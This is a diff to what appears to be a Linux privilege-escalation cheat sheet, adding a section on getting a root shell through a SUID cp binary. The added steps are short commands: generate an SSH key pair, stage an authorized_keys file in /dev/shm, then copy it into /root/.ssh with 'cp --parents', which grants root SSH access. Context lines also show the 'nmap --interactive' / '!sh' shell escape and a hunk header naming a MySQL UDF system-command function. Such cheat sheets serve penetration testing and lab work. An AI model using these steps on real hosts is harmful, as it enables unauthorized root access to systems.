@@ -618,3 +618,13 @@ char do_system_init(UDF_INIT *initid, UDF_ARGS *args, char *message)
 nmap --interactive
 !sh
 ```
+
+### Getting shell using SUID cp
+
+```
+1. Create a paired ssh key using ssh-keygen from your box and "chmod 600 id_rsa" + "chmod 600 id_rsa.pub"
+2. With lower privileged user on the target host navigate to /dev/shm
+3. Create a .ssh folder and create an "authorized_keys" file
+4. Dump your public key data into the authorized_keys file
+5. Use the following cp command to create a .ssh folder as root and copy authorized_keys into it "cp --parents .ssh/authorized_keys /root"
+```
